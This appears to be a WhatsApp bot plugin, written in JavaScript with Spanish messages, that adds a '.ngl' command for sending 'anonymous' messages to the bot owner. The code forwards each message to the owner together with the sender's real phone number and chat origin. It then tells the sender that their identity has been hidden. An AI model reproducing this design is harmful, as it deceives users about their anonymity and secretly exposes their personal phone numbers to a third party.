let handler = async (m, { conn, text }) => {
  if (!text) {
    return m.reply(`
🧠 *Uso correcto:*
> .ngl <mensaje>

💬 *Ejemplo:*
> .ngl Me gusta cómo funciona el bot 😳
    `.trim())
  }

  const ownerJid = global.owner[0] + '@s.whatsapp.net'
  const anonMsg = text.trim()
  const senderNum = m.sender.split('@')[0]
  const fromGroup = m.isGroup ? `📣 Grupo: ${m.chat}` : '💬 Chat privado'

  // 🧪 Mensaje decorado que se enviará al owner (con número real)
  const msgToOwner = `
╭━━━━━━━『 💬 𝗠𝗘𝗡𝗦𝗔𝗝𝗘 𝗔𝗡𝗢́𝗡𝗜𝗠𝗢 』━━━━━━━╮
┃ ⚙️ *Origen:* ${fromGroup}
┃ 👤 *Número real:* +${senderNum}
┃ 🧠 *Contenido:*
┃ ${anonMsg}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
👨‍🔬 “¡La información es poder, incluso en el anonimato!” – Senku
`.trim()

  try {
    // Envía al owner con número visible
    await conn.sendMessage(ownerJid, { text: msgToOwner, mentions: [m.sender] })

  
    await conn.sendMessage(m.chat, {
      text: `
🧪 *Mensaje enviado anónimamente al creador.*

“Tu identidad ha sido ocultada con la precisión de la ciencia moderna.” 🔬
`.trim(),
      quoted: m
    })

    await m.react('✅')
  } catch (e) {
    console.error(e)
    await m.reply('⚠️ *Error científico:* No pude enviar tu mensaje al creador.')
  }
}

handler.help = ['ngl <texto>']
handler.tags = ['ngl']
handler.command = /^ngl$/i
handler.register = false

export default handler
